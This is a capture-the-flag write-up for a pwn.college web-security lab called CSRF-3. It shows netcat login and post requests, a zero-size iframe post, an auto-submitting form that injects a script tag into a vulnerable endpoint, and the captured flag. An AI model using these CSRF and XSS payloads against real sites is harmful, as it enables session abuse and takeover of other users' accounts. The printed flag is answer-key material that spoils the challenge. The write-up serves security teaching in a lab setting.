---
layout: page
title: "CSRF-3 Write-up — pwn.college"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🔍 Challenge Overview

This challenge simulates a vulnerable blogging platform where users can:

- Log in
- Draft and publish posts
- View others’ published content

The admin logs into the platform and then automatically visits attacker-controlled pages via `/challenge/victim`.

Our goal is to **perform a CSRF attack** to make the admin execute an **XSS payload** by visiting our crafted post. Once the script runs in the admin's browser, the challenge system will trigger an alert, revealing the flag.

---

## 🖥️ Server Behavior Summary

Key endpoints:

- `/login`: Logs users in using form-based credentials
- `/draft`: Allows users to submit post drafts
- `/`: Homepage displaying UI depending on session status
- Admin auto-visits attacker pages via `/challenge/victim`
- **No CSRF protection is implemented**

---

## ✅ Exploit Steps

### 1. Log in as the `hacker` user

```bash
printf "POST /login HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:29\r\n\r\nusername=hacker&password=1337" | nc challenge.localhost 80
```
You'll receive a response with:
```
Set-Cookie: auth=hacker|1337; Path=/
```
This confirms you're logged in.

### 2. Create a malicious iframe post
```bash
PAYLOAD="content=%3Ciframe%20src%3D%22http%3A//hacker.localhost%3A1337/%22%20width%3D%220%22%20height%3D%220%22%3E%3C/iframe%3E&publish=on"
LENGTH=$(echo -n "$PAYLOAD" | wc -c)
```
Then send it using netcat:
```bash
echo -e "POST /draft HTTP/1.0\r
Host: challenge.localhost\r
Cookie: auth=hacker|1337\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: $LENGTH\r
\r
$PAYLOAD" | nc challenge.localhost 80
```
This saves and publishes a post with an embedded iframe pointing to your server.

### 3. Create a CSRF page on your server
Create an index.html file containing the CSRF attack:
```bash
<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://challenge.localhost/ephemeral" method="GET">
      <input type="hidden" name="msg" value="<script>alert('PWNED')</script>">
    </form>
  </body>
</html>
```
This page uses a form that auto-submits a GET request to the vulnerable endpoint /ephemeral, injecting a script via the msg parameter.

### 4. Host the malicious page
Start a simple HTTP server on port 1337 to serve your CSRF page:
```
python3 -m http.server 1337
```
Output:
```bash
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

### 5. Trigger the admin to visit your post
Run the automated victim visit:
```bash
/challenge/victim
```
You'll see output like:
```bash
Visiting http://challenge.localhost:80/
Logging in as admin...
Logged in!
Visiting the attacker's website (http://hacker.localhost:1337/)...
Alert triggered! Your reward:
pwn.college{IhZEUgLW8CZHM_MibmYqDqZzr0O.QXzgTN2wSM0IzMyEzW}
```

---
## Final Result
The admin visits the malicious iframe → the iframe loads your CSRF page → the form is submitted → the JavaScript executes → XSS alert is triggered → flag is captured.
### Flag
```
pwn.college{IhZEUgLW8CZHM_MibmYqDqZzr0O.QXzgTN2wSM0IzMyEzW}
```
---

